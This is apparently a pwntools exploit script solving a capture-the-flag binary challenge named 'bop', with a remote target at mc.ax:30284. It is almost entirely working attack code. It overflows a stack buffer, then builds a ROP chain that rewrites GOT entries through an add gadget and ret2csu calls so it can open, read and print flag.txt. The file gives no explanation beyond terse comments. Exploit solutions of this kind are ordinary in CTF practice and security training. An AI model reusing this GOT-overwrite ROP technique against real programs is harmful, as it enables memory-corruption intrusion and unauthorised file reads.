#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("bop_patched")
libc = ELF("./libc.so.6")

# shortcuts
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)

host, port = "mc.ax", "30284"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])


gadget_add = 0x00000000004011fc # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
set_csu = 0x00000000004013ca # pop rbx/etc...
call_csu = 0x4013b0
pop_rdi = 0x00000000004013d3
pop_rsi = 0x00000000004013d1
# in libc
rop = ROP(libc)
syscall_ret = rop.find_gadget(['syscall', 'ret'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]

def add_gadget(address, val):
  global gadget_add
  global set_csu
  return p64(set_csu)+p64(val & 0xffffffff)+p64(address+0x3d)+p64(0)*4+p64(gadget_add)

def csucall(func,arg1,arg2,arg3):
  return p64(set_csu)+p64(0)+p64(1)+p64(arg1)+p64(arg2)+p64(arg3)+p64(func)+p64(call_csu)+p64(0)*7

payload = b'A'*0x20+p64(0xdeadbeef)
# write filename at 0x404100 (in bss)
payload += p64(pop_rdi)+p64(0x404100)+p64(exe.sym['gets'])
# change gets got entry to pop rax
payload += add_gadget(exe.got['gets'], pop_rax - libc.sym['gets'])
# change printf got entry to syscall/ret
payload += add_gadget(exe.got['printf'], syscall_ret - libc.sym['printf'])
# pop rax/ open('filename', 0)
payload += p64(exe.sym['gets'])+p64(2)+csucall(exe.got['printf'],0x404100,0,0)

# read flag in bss at 0x404200
payload += add_gadget(exe.got['setbuf'], libc.sym['read'] - libc.sym['setbuf'])
payload += csucall(exe.got['setbuf'],3,0x404200,64)
# write back flag to stdout
payload += add_gadget(exe.got['setbuf'], libc.sym['write'] - libc.sym['read'])
payload += csucall(exe.got['setbuf'],1,0x404200,64)
# exit
payload += p64(exe.sym['exit'])

sla('bop? ', payload)
sl('flag.txt')

p.interactive()

